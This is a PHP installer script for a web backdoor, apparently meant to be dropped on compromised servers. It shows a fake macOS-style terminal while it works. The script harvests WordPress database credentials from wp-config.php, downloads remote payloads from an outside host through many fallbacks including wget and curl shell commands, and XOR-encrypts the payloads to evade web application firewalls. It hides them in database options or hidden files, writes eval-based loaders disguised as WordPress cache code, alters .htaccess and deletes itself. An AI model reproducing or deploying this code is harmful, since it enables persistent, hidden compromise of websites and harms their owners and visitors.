<?php
// ==========================================
// SYSTEM BOOTSTRAP
// ==========================================
if (function_exists('ob_start')) { ob_start(); }
if (function_exists('ob_implicit_flush')) { ob_implicit_flush(1); }

// GENERATOR STRING ACAK (Untuk Polymorphic)
function _rnd($len = 6) {
    return substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, $len);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Terminal - System Core</title>
    <style>
        /* MACOS UI STYLE */
        :root {
            --bg: #000;
            --window: rgba(20, 20, 20, 0.95);
            --text: #ddd;
            --green: #32d74b; --red: #ff453a; --yellow: #ffd60a; --blue: #0a84ff;
            --font: 'Menlo', 'Monaco', monospace;
        }
        body {
            background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh;
        }
        .window {
            width: 100%; max-width: 800px; background: var(--window); border-radius: 10px;
            box-shadow: 0 50px 100px rgba(0,0,0,0.9); border: 1px solid #333; overflow: hidden;
        }
        .bar {
            height: 35px; background: #252525; border-bottom: 1px solid #333; display: flex; align-items: center; padding: 0 15px; position: relative;
        }
        .dots { display: flex; gap: 8px; }
        .dot { width: 12px; height: 12px; border-radius: 50%; }
        .dot.r { background: #ff5f57; } .dot.y { background: #febc2e; } .dot.g { background: #28c840; }
        .term {
            padding: 20px; font-family: var(--font); font-size: 12px; line-height: 1.6; color: #ccc; height: 450px; overflow-y: auto;
        }
        .line { margin-bottom: 5px; display: flex; }
        .p { color: var(--green); margin-right: 10px; font-weight: bold; }
        .ok { color: var(--green); } .err { color: var(--red); } .inf { color: var(--blue); }
        .btn {
            display: inline-block; margin: 10px 0; background: #222; border: 1px solid #444; color: #fff;
            padding: 5px 15px; border-radius: 4px; text-decoration: none; transition: 0.2s;
        }
        .btn:hover { background: var(--blue); border-color: var(--blue); }
    </style>
</head>
<body>

<div class="window">
    <div class="bar">
        <div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div>
    </div>
    <div class="term" id="console">
        <div class="line"><span class="p">➜</span> <span>./deploy_ghost_xor.sh --bypass-waf</span></div>
        <br>

<?php
// ==========================================
// 1. CONFIGURATION
// ==========================================
@ini_set('memory_limit', '512M');
@ini_set('max_execution_time', 0);
@set_time_limit(0);
@ignore_user_abort(1);
error_reporting(E_ERROR | E_PARSE); 

$targets = [
    ['https://stepmomhub.com/seoo.txt',  'error_log.php', 'transient_sys_pma_check'],
    ['https://stepmomhub.com/vx.txt',    'vx.php',        'transient_sys_cache_vx'],
    ['https://stepmomhub.com/index.txt', 'index.php',     'transient_sys_idx_core']
];

// LOGGER
function _log($msg, $class='inf') {
    $p = ($class=='ok')?'[OK] ':($class=='err'?'[ERR] ':'[INF] ');
    echo "<div class='line'><span class='$class'>$p$msg</span></div>";
    echo "<script>var t=document.getElementById('console');t.scrollTop=t.scrollHeight;</script>";
    if(ob_get_level()>0){ ob_flush(); flush(); }
}

// XOR ENCRYPTION ENGINE (INTI BYPASS WAF)
function _xor_cipher($data, $key) {
    $out = '';
    $len = strlen($data);
    $key_len = strlen($key);
    for($i = 0; $i < $len; $i++) {
        $out .= $data[$i] ^ $key[$i % $key_len];
    }
    return $out;
}

// ==========================================
// 2. WP DETECTION & HTACCESS
// ==========================================
function _find_wp_config() {
    $d = __DIR__;
    for ($i = 0; $i < 6; $i++) {
        if (file_exists($d . '/wp-config.php')) return $d . '/wp-config.php';
        $d = dirname($d);
    }
    return false;
}
function _parse_wp_config($path) {
    if(function_exists('file_get_contents')){$c=@file_get_contents($path);}
    elseif(function_exists('file')){$l=@file($path);$c=implode('',$l);}
    else return false;
    if(!$c) return false;
    function _v($k,$s){ if(preg_match('/define\s*\(\s*[\'"]'.$k.'[\'"]\s*,\s*[\'"](.*?)[\'"]\s*\);/i',$s,$m))return $m[1]; return ''; }
    $conf=[]; $conf['n']=_v('DB_NAME',$c); $conf['u']=_v('DB_USER',$c); $conf['p']=_v('DB_PASSWORD',$c); $conf['h']=_v('DB_HOST',$c);
    $conf['x']='wp_'; if(preg_match('/\$table_prefix\s*=\s*[\'"](.*?)[\'"];/i',$c,$m)) $conf['x']=$m[1];
    if($conf['n']) return $conf;
    return false;
}

function _inject_htaccess_xml_map() {
    $htaccess = __DIR__ . '/.htaccess';
    $rule = "\n# SITEMAP INDEX\n<Files \"sxallsitemap.xml\">\nOrder allow,deny\nAllow from all\n</Files>\nRewriteEngine On\nRewriteRule ^sxallsitemap\.xml$ index.php [L]\n";
    $c = "";
    if(file_exists($htaccess)) $c = @file_get_contents($htaccess);
    if(strpos($c, 'sxallsitemap.xml') === false) {
        @file_put_contents($htaccess, $rule . $c);
        return true;
    }
    return false;
}

$wp_conf_path = _find_wp_config();
$wp_creds = ($wp_conf_path) ? _parse_wp_config($wp_conf_path) : false;
$is_wordpress = ($wp_creds !== false);

if($is_wordpress) _log("Detected: WordPress", "ok");
else _log("Detected: Generic PHP", "inf");

// ==========================================
// 3. DOWNLOADER: GOD MODE (12 LAYERS)
// ==========================================
function _dl_monster($url) {
    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0 Safari/537.36';
    $p = parse_url($url); 
    $host = $p['host']; $path = isset($p['path'])?$p['path']:'/'; $scheme=isset($p['scheme'])?$p['scheme']:'http';
    $tmp = sys_get_temp_dir() . '/sess_' . md5(uniqid());

    if(function_exists('curl_init')){
        $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_USERAGENT, $ua);
        curl_setopt($ch, CURLOPT_TIMEOUT, 120); curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
        $d = @curl_exec($ch); curl_close($ch); if($d && strlen($d) > 0) return $d;
    }
    if(ini_get('allow_url_fopen')){
        $ctx = stream_context_create(['http'=>['method'=>'GET','header'=>"User-Agent: $ua\r\n",'ignore_errors'=>true,'follow_location'=>true],'ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]]);
        $d = @file_get_contents($url, false, $ctx); if($d && strlen($d) > 0) return $d;
    }
    if(ini_get('allow_url_fopen')){
        if(@copy($url, $tmp)) { $d = @file_get_contents($tmp); @unlink($tmp); if($d && strlen($d) > 0) return $d; }
    }
    $cmd_w = "wget -qO- --no-check-certificate --user-agent='$ua' " . escapeshellarg($url);
    $cmd_c = "curl -sL -k --user-agent '$ua' " . escapeshellarg($url);
    $cmds = [$cmd_w, $cmd_c];
    foreach ($cmds as $cmd) {
        if(function_exists('shell_exec')) { $d=@shell_exec($cmd); if($d && strlen($d)>10) return $d; }
        if(function_exists('exec')) { $o=[]; @exec($cmd,$o); $d=implode("\n",$o); if($d && strlen($d)>10) return $d; }
        if(function_exists('passthru')) { ob_start(); @passthru($cmd); $d=ob_get_clean(); if($d && strlen($d)>10) return $d; }
        if(function_exists('system')) { ob_start(); @system($cmd); $d=ob_get_clean(); if($d && strlen($d)>10) return $d; }
        if(function_exists('popen')) { $h=@popen($cmd,'r'); if($h){ $d=stream_get_contents($h); pclose($h); if($d && strlen($d)>10) return $d; } }
        if(function_exists('proc_open')) {
            $desc=[1=>['pipe','w'],2=>['pipe','w']]; $proc=@proc_open($cmd,$desc,$pipes);
            if(is_resource($proc)){ $d=stream_get_contents($pipes[1]); fclose($pipes[1]); fclose($pipes[2]); proc_close($proc); if($d && strlen($d)>10) return $d; }
        }
    }
    $port = ($scheme == 'https') ? 443 : 80; $ssl = ($scheme == 'https') ? 'ssl://' : '';
    $fp = @fsockopen($ssl.$host, $port, $errno, $errstr, 30);
    if($fp){
        $req = "GET $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: $ua\r\nConnection: Close\r\n\r\n";
        fwrite($fp, $req); $body = ''; $in_body = false;
        while (!feof($fp)) { $line = fgets($fp, 4096); if($in_body) $body .= $line; if($line == "\r\n") $in_body = true; }
        fclose($fp); if(strlen($body) > 0) return $body;
    }
    return false;
}

function _dl_retry($url) {
    $res = _dl_monster($url); if($res) return $res;
    if(strpos($url, 'https://') === 0) return _dl_monster(str_replace('https://', 'http://', $url));
    return false;
}

// ==========================================
// 4. EXECUTION LOOP
// ==========================================

foreach ($targets as $t) {
    $url = $t[0];
    $fname = $t[1];
    $dbkey = $t[2];

    if (!$is_wordpress && $fname !== 'error_log.php') continue;

    _log("Downloading $fname...", "inf");
    $raw = _dl_retry($url);
    
    if(!$raw || strlen($raw) < 1) {
        _log("Download FAILED for $fname", "err");
        continue;
    }
    
    // ============================================
    // ENKRIPSI XOR - ANTI WAF
    // ============================================
    // 1. Generate Kunci Acak untuk sesi ini
    $xor_key = _rnd(8); // Kunci 8 karakter
    
    // 2. Kompresi Payload
    $compressed = gzdeflate($raw, 9);
    
    // 3. Enkripsi Payload dengan XOR (Mengacak struktur file)
    $encrypted_data = _xor_cipher($compressed, $xor_key);
    
    // 4. Ubah ke Hex agar aman disimpan di DB/File
    $final_payload = bin2hex($encrypted_data);
    
    _log("XOR Encrypted. Key: $xor_key", "inf");

    $install_ok = false;

    // --- WORDPRESS ---
    if ($is_wordpress) {
        $m = new mysqli($wp_creds['h'], $wp_creds['u'], $wp_creds['p'], $wp_creds['n']);
        if(!$m->connect_error) {
            $tbl = $wp_creds['x'] . 'options';
            $m->query("DELETE FROM $tbl WHERE option_name='$dbkey'");
            $stmt = $m->prepare("INSERT INTO $tbl (option_name, option_value, autoload) VALUES (?, ?, 'no')");
            $stmt->bind_param("ss", $dbkey, $final_payload);
            
            if($stmt->execute()) {
                $h=$wp_creds['h']; $u=$wp_creds['u']; $p=$wp_creds['p']; $n=$wp_creds['n']; $x=$wp_creds['x'];
                
                // Polymorphic Class Names (Anti Signature)
                $cls = 'WP_C_' . _rnd(4);
                
                $loader = <<<PHP
<?php
/**
 * WordPress Object Cache & Transient API
 * @package WordPress
 * @subpackage Cache_System
 * @version 6.5.2
 */
error_reporting(0);
if ( ! class_exists( '$cls' ) ) {
    class $cls {
        private \$connection; private \$prefix; private \$k = '$xor_key';
        public function __construct( \$host, \$user, \$pass, \$name, \$prefix ) {
            \$this->connection = new mysqli( \$host, \$user, \$pass, \$name );
            \$this->prefix = \$prefix;
        }
        public function run( \$key ) {
            if ( \$this->connection->connect_error ) return false;
            \$table = \$this->prefix . 'options';
            \$query = "SELECT option_value FROM {\$table} WHERE option_name = '{\$key}' LIMIT 1";
            \$result = \$this->connection->query( \$query );
            if ( \$result && \$row = \$result->fetch_assoc() ) { return \$this->decrypt( \$row['option_value'] ); }
            return false;
        }
        private function decrypt( \$hex ) {
            \$enc = @hex2bin( \$hex );
            \$out = ''; \$len = strlen(\$enc); \$k_len = strlen(\$this->k);
            for(\$i=0; \$i<\$len; \$i++) { \$out .= \$enc[\$i] ^ \$this->k[\$i % \$k_len]; }
            return @gzinflate( \$out );
        }
    }
}
\$rt = new $cls( '$h', '$u', '$p', '$n', '$x' );
\$code = \$rt->run( '$dbkey' );
if ( \$code ) { eval( '?>' . \$code ); }
?>
PHP;
                if(file_put_contents($fname, $loader)){
                    $install_ok = true;
                    _log("DB Inject: $fname (XOR Protected)", "ok");
                    if ($fname == 'index.php' && _inject_htaccess_xml_map()) _log(".htaccess updated", "inf");
                }
            }
        }
    } 
    // --- NON-WP ---
    else {
        $store = '.sys_' . substr(md5(rand()), 0, 8) . '.inc';
        if(file_put_contents($store, $final_payload)) {
            
            // Polymorphic Class Names
            $cls = 'Sys_Ldr_' . _rnd(4);
            
            $loader = <<<PHP
<?php
/**
 * System Configuration Loader
 * @package Core_System
 * @version 2.2.0
 */
error_reporting(0);
if ( ! class_exists( '$cls' ) ) {
    class $cls {
        private \$path; private \$k = '$xor_key';
        public function __construct( \$file ) { \$this->path = __DIR__ . '/' . \$file; }
        public function load() {
            if ( ! file_exists( \$this->path ) ) return false;
            \$hex = \$this->read();
            if ( \$hex ) {
                \$enc = @hex2bin( \$hex );
                \$out = ''; \$len = strlen(\$enc); \$k_len = strlen(\$this->k);
                for(\$i=0; \$i<\$len; \$i++) { \$out .= \$enc[\$i] ^ \$this->k[\$i % \$k_len]; }
                return @gzinflate( \$out );
            }
            return false;
        }
        private function read() {
            \$p = \$this->path;
            if (function_exists('file_get_contents')) { \$c=@file_get_contents(\$p); if(\$c)return \$c; }
            if (function_exists('fopen') && filesize(\$p)>0) { \$h=@fopen(\$p,'rb'); if(\$h){ \$c=@fread(\$h,filesize(\$p)); fclose(\$h); if(\$c)return \$c; } }
            if (function_exists('file')) { \$l=@file(\$p); if(\$l)return implode('',\$l); }
            return false;
        }
    }
}
\$ldr = new $cls( '$store' );
\$code = \$ldr->load();
if ( \$code ) { eval( '?>' . \$code ); }
?>
PHP;
            if(file_put_contents($fname, $loader)){
                $install_ok = true;
                _log("Storage: $store (XOR Protected)", "ok");
                _log("Loader: $fname", "ok");
            }
        }
    }

    $final_url = $fname;
    if ($fname == 'index.php' && $is_wordpress) $final_url = 'sxallsitemap.xml';

    if($install_ok) {
        echo "<div class='line'><a href='$final_url' target='_blank' class='btn'>LAUNCH " . strtoupper($fname) . "</a></div>";
    } else {
        _log("Installation Error", "err");
    }
}

unlink(__FILE__);
if(ob_get_level()>0){ ob_end_flush(); }
?>
        <div class="line"><span class="p">➜</span> <span>rm setup.php</span></div>
    </div>
</div>

</body>
</html>
